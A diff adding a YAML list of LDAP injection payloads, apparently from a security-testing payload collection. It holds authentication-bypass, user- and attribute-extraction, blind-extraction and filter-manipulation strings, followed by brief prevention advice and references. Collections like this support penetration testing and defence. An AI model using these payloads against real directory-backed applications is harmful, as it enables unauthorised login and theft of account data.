@@ -1,0 +1,85 @@
+# LDAP Injection Payloads
+# Targeting enterprise apps with Active Directory / LDAP backends
+
+payload_category: "ldap-injection"
+owasp_2025: "A05"
+cwe: "CWE-90"
+severity: "HIGH"
+
+# ===== AUTH BYPASS =====
+auth_bypass:
+  basic:
+    - "*"
+    - "*)(uid=*))(|(uid=*"
+    - "admin)(&)"
+    - "admin)(|(password=*"
+    - "*)(&(objectClass=*"
+    - "*)(objectClass=*))(&(objectClass=*"
+    - "admin)(!(&(1=0"
+
+  username_field:
+    - "*)(uid=*))(|(uid=*"
+    - "admin*"
+    - "*)(&"
+    - "*)(objectClass=*))(&(objectClass=*"
+    - "admin))(|(uid=*"
+    - "x])(uid=*))(|(uid=*"
+
+  password_field:
+    - "*"
+    - "*)(&"
+    - "*)(uid=*"
+    - "pass)(|(uid=*"
+
+# ===== DATA EXTRACTION =====
+data_extraction:
+  user_enumeration:
+    - "*)(&(objectClass=person)"
+    - "*)(uid=admin*"
+    - "*)(cn=*admin*"
+    - "*)(mail=*@company.com"
+    - "*)(sAMAccountName=*"
+
+  attribute_extraction:
+    - "*)(userPassword=*"
+    - "*)(telephoneNumber=*"
+    - "*)(description=*"
+    - "*)(memberOf=CN=Admins*"
+    - "*)(title=*"
+
+# ===== BOOLEAN BLIND =====
+blind:
+  - "*)(uid=admin)(|(uid=*"
+  - "*)(uid=admi*)(|(uid=*"
+  - "*)(uid=a*)(|(uid=*"
+  - "Description: character-by-character extraction via wildcard"
+
+# ===== FILTER MANIPULATION =====
+filter_manipulation:
+  or_injection:
+    - ")(|(uid=*"
+    - ")(|(objectClass=*"
+    - ")(|(cn=*"
+
+  and_injection:
+    - ")(&(uid=*"
+    - ")(&(objectClass=person"
+
+  not_injection:
+    - ")(!(uid=disabled*"
+
+  nested:
+    - "))(|(uid=*))(|(uid=*"
+    - "))(objectClass=*"
+
+prevention:
+  - "Use parameterized LDAP queries"
+  - "Escape special characters: *, (, ), \\, NUL"
+  - "Input validation with whitelist"
+  - "Use LDAP frameworks with built-in escaping"
+  - "Principle of least privilege for LDAP bind accounts"
+
+references:
+  - "OWASP Top 10:2025 A05"
+  - "CWE-90: LDAP Injection"
+  - "PayloadsAllTheThings: LDAP Injection"
